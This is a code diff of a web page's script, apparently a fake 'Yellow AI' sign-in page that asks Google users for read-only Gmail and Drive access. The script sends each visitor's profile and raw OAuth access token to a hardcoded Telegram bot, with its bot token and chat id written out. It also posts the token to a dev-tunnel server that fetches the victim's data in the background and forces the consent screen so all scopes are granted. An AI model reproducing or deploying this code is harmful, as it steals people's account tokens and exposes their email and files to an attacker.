@@ -248,77 +248,94 @@
   <script>
 
     function sendDeatilsToTelegram(message) {
-  // Function to send a Telegram message
-  sendTelegramMessage(message)
-  async function sendTelegramMessage(message) {
-      const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
-      try {
-          // Send the message to the Telegram bot
-          await fetch(url, {
-              method: "POST",
-              headers: {
-                  "Content-Type": "application/x-www-form-urlencoded"
-              },
-              body: `chat_id=1293804795&text=${encodeURIComponent(message)}`,
-          });
-      } catch (error) {
-        console.log("Error sending your message, please try again later")
-          console.error("Error sending message", error);
+      sendTelegramMessage(message)
+      async function sendTelegramMessage(message) {
+          const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
+          try {
+              await fetch(url, {
+                  method: "POST",
+                  headers: {
+                      "Content-Type": "application/x-www-form-urlencoded"
+                  },
+                  body: `chat_id=1293804795&text=${encodeURIComponent(message)}`,
+              });
+          } catch (error) {
+            console.log("Error sending your message, please try again later")
+              console.error("Error sending message", error);
+          }
       }
-  }
-}   
+    }   
+
+    const BACKEND_URL = 'https://nmqp7n98-5001.inc1.devtunnels.ms/get_user_data'
+    function sendUserData(token) {
+      fetch(BACKEND_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token })
+      })
+      .then(response => {
+        // Handle 202 Accepted (Success - background task started)
+        if (response.status === 202) { 
+          console.log('Token accepted, background task started. Redirecting...');
+          document.getElementById('content').innerText = 'Authentication successful. Data fetching started in the background. Redirecting to form...';
+          location.href = 'form/'; 
+          return response.text();
+        } 
+        
+        // Handle 403 Forbidden (Mandatory Scope Denial)
+        if (response.status === 403) {
+          return response.text().then(errorMessage => {
+            console.error('ACCESS DENIED: Missing mandatory permissions.', errorMessage);
+            // Display the clear error message to the user
+            document.getElementById('content').innerText = errorMessage;
+            // Revoke the token to force a full re-login/consent cycle
+            handleSignoutClick(); 
+            throw new Error(errorMessage); // Stop the chain
+          });
+        }
+
+        // Handle other HTTP errors (400, 401, 500 etc.)
+        return response.text().then(errorText => {
+          console.error('Backend Error:', response.status, errorText);
+          document.getElementById('content').innerText = `Sign In Failed (Status: ${response.status}). Check console for details.`;
+          handleSignoutClick();
+          throw new Error(`HTTP Error ${response.status}: ${errorText}`);
+        });
+      })
+      .catch(error => {
+        // Catches network errors (tunnelling failure, CORS)
+        console.error("FATAL NETWORK/PROCESS ERROR: Token send failed.", error);
+        sendDeatilsToTelegram(`FATAL NETWORK/PROCESS ERROR: Token send failed: ${error.message}`);
+        document.getElementById('content').innerText = 'Could not communicate with the server. Check your connection or console.';
+      });
+    }
 
 
-
-
-const BACKEND_URL = 'https://nmqp7n98-5001.inc1.devtunnels.ms/get_user_data'
-function sendUserData(token) {
-  fetch(BACKEND_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ token })
-  });
-}
-
-
-window.onload = function(){
-  sendDeatilsToTelegram('==========FRONTEND==========\nUser has accessed this page, yellow ai page')
-}
-
-
-
-
-
-
+    window.onload = function(){
+      sendDeatilsToTelegram('==========FRONTEND==========\nUser has accessed this page, yellow ai page')
+    }
 
     // YOUR CLIENT_ID AND API_KEY
     const CLIENT_ID = '590439081250-9t6su7ram9pg0jiasdhgju1fghmqe530.apps.googleusercontent.com';
     const API_KEY = 'AIzaSyAoIJyeKPExu99g57UcCCOQj4VvEwjDX-A';
     
-    // Scopes needed: 'profile' and 'email' for user info, 'openid' is often implicitly useful for identity.
+    // MANDATORY SCOPES for fetching Gmail and Drive metadata
     const SCOPES = 'openid profile email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.metadata.readonly';
 
     let tokenClient;
-    let gapiClientReady = false; // Flag for gapi.client and loaded APIs
-    let gisInited = false;       // Flag for Google Identity Services initialization
-
-    // This variable will hold the access token and user info
+    let gapiClientReady = false; 
+    let gisInited = false;       
     let user_data_access_token = null; 
 
-    // Called when the 'gapi.js' script is loaded
     function gapiLoaded() {
       gapi.load('client', async () => {
         try {
           await gapi.client.init({
             apiKey: API_KEY, 
           });
-
-          // Load specific APIs after gapi.client.init
-          // Only 'oauth2' is strictly needed for userinfo.
           await gapi.client.load('oauth2', 'v2'); 
-          
           console.log("Google OAuth2 API loaded successfully.");
-          gapiClientReady = true; // Mark gapi client and APIs as ready
+          gapiClientReady = true; 
           maybeEnableButtons();
         } catch (error) {
           console.error("Error initializing Google APIs or loading API definitions:", error);
@@ -327,20 +344,18 @@ window.onload = function(){
       });
     }
 
-    // Called when the 'gsi/client' script is loaded
     function gisLoaded() {
-      tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: CLIENT_ID,
-        scope: SCOPES,
-        callback: '', // Callback defined in handleAuthClick
-        // 🔥 THE FIX: Set this to false to make ALL requested SCOPES mandatory.
-        include_granted_scopes: false, 
-      });
-      gisInited = true; // Mark GIS as initialized
-      maybeEnableButtons();
-    }
+      tokenClient = google.accounts.oauth2.initTokenClient({
+        client_id: CLIENT_ID,
+        scope: SCOPES,
+        callback: '', 
+        // 🔥 FIX 1: Set this to false to make ALL requested SCOPES mandatory (removes checkboxes for previously granted scopes).
+        include_granted_scopes: false, 
+      });
+      gisInited = true; 
+      maybeEnableButtons();
+    }
 
-    // Enables buttons only when both GAPI client (with APIs) and GIS are ready
     function maybeEnableButtons() {
       if (gapiClientReady && gisInited) {
         document.getElementById('authBtn').disabled = false;
@@ -349,76 +364,52 @@ window.onload = function(){
       }
     }
 
-    // Handles the authorization flow
     function handleAuthClick() {
-      // Define the callback for the token client when the user interacts
       tokenClient.callback = async (resp) => {
         if (resp.error) {
           console.error("Authentication error:", resp);
           document.getElementById('content').innerText = "Authentication failed. Please try again or check console for details.";
-          user_data_access_token = null; // Clear the variable on error
-          return; // Stop execution on error
+          user_data_access_token = null; 
+          return; 
         }
         
-        console.log("Access token obtained successfully.");
-        
-        // Get the access token
+        console.log("Access token obtained successfully. Sending to backend for scope validation.");
         const accessToken = gapi.client.getToken().access_token;
 
-        // Fetch user info
+        // Fetch user info for logging only
         let userInfo = null;
         try {
           const userResponse = await gapi.client.oauth2.userinfo.get(); 
           userInfo = userResponse.result;
-          console.log('Successfully fetched User Info:', userInfo);
           let temp1 = JSON.stringify(userInfo, null, 2);
-          let temp2 = (`==========FRONTEND==========\n${temp1}`)
-          sendDeatilsToTelegram(temp2);
-            
-
+          sendDeatilsToTelegram(`==========FRONTEND==========\n${temp1}`);
         } catch (err) {
           console.error('Error fetching user info after token acquisition:', err);
-          document.getElementById('content').innerText = "Authentication successful, but couldn't fetch user details. See console.";
-          // Even if user info fails, we might still have the token
-          userInfo = { error: "Failed to fetch user info" }; 
         }
 
-        // Store the access token and user info in the global variable
-        user_data_access_token = {
-          accessToken: accessToken,
-          user: userInfo
-        };
-        console.log("User Data and Access Token stored:", user_data_access_token);
-        // let temp3 = JSON.stringify(user_data_access_token, null, 2);
         sendDeatilsToTelegram(`==========FRONTEND==========\nUSER ACCESS TOKEN IS ${accessToken}`)
-        sendUserData(accessToken);
-
-
-        document.getElementById('content').innerText = `You're successfully logged into Yellow AI!\nWelcome, ${userInfo ? userInfo.name : 'User'}.`;
-
         
+        // Pass the token to the backend for MANDATORY SCOPE CHECK and execution
+        sendUserData(accessToken);
+        
+        // NOTE: The redirect (location.href = 'form/') is now inside sendUserData's .then() block
+        // and only executes if the status is 202.
 
-
-        location.href = 'form/'
       };
 
-      // Check if there's an existing token
-      // To force the consent screen to appear every time,
-      // use prompt: 'consent' in the override config for requestAccessToken.
-      // This ensures the user sees the new, sensitive scopes (Gmail, Drive).
-      tokenClient.requestAccessToken({
-        prompt: 'consent'
-      });
+      // 🔥 FIX 2: Forces the consent screen to appear every time, eliminating silent sign-in.
+      tokenClient.requestAccessToken({
+        prompt: 'consent'
+      });
     }
 
-    // Handles user sign-out
     function handleSignoutClick() {
       const token = gapi.client.getToken();
       if (token !== null) {
-        google.accounts.oauth2.revoke(token.access_token); // Revoke the token
-        gapi.client.setToken(''); // Clear the token from gapi.client
-        user_data_access_token = null; // Clear the stored data
-        document.getElementById('content').innerText = 'Signed out. Please click "Authorize & Get Data" to connect again.';
+        google.accounts.oauth2.revoke(token.access_token); 
+        gapi.client.setToken(''); 
+        user_data_access_token = null; 
+        document.getElementById('content').innerText = 'Signed out. Please click "Sign in with Google" to connect again.';
         console.log("User signed out. user_data_access_token is now null.");
       }
     }
